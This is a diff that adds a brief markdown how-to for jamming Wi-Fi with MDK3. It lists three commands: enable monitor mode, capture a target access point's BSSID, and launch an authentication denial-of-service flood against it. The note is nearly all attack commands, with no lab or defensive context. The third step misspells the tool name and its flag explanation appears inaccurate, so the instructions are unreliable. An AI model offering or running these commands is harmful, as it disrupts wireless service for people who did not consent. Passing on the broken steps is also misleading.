@@ -1,0 +1,10 @@
+# Wifi jamming with MDK3.
+
+Step 1: airmon-ng start wlan0
+Step 2: airodump-ng wlan0 [& copy your bssid]
+Step 3: mkd3 wlan0 a -e (bssid)
+
+Wherein, a = authentication DoS mode.
+         e = To send to specified bssid.
+         
+         
